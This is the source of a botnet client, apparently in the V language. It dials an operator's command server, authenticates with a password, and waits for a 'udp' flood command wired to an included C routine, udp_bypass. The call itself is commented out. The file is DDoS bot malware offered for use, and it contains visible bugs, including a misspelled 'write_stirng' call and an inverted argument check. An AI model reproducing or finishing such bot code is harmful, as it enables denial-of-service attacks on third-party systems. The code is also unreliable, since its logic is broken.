import os
import io
import net
import time

#include "@VROOT/methods/udp.c"

fn C.udp_bypass(string, u16, int)

fn main() {
	mut args := os.args.clone()
	if args.len < 4 {
		println("[x] Error, arguments provided!\n${args[0]} <ip> <port>")
		exit(0)
	}
	go server(args[1], args[2], args[3])
	for {

	}
}

fn server(ip string, port string, pw string) { 
	mut server := net.dial_tcp("${ip}:${port}") or {
		println("[x] Error, Unable to connect to the server....")
		exit(0)
	}

	mut reader := io.new_buffered_reader(reader: server)
	server.write_string("${pw}\n") or { 0 } // Send PW
	time.sleep(2*time.second)
	check := reader.read_line() or { "" }
	if check.replace("\n", "") == "[x]" { exit(0) }

	server.write_string("cpu_here\n") or { 0 } // Send CPU ARCH
	for {
		data := reader.read_line() or { "" }
		fcmd, cmd, args := parse_buffer(data)

		match cmd {
			"udp" {
				if args.len < 4 {
					server.write_stirng("[ + ] Attack being sent....\n") or { 0 }
					// C.udp_bypass(args[1], args[2], args[3])
					server.write_stirng("[ + ] Attack Successfully finished....\n") or { 0 }
				} else {
					server.write_string("[ x ] Error, Something went wrong sending attack.....\n") or { 0 }
				}
			} else {}
		}
		
	}

}

fn parse_buffer(buff string) (string, string, []string) {
	mut args := []string{}
	mut cmd := ""
	if buff.contains(" ") {
		args = buff.split(" ")
		cmd = args[0]
	} else {
		args << buff
		cmd = buff
	}
	return buff, cmd, args
}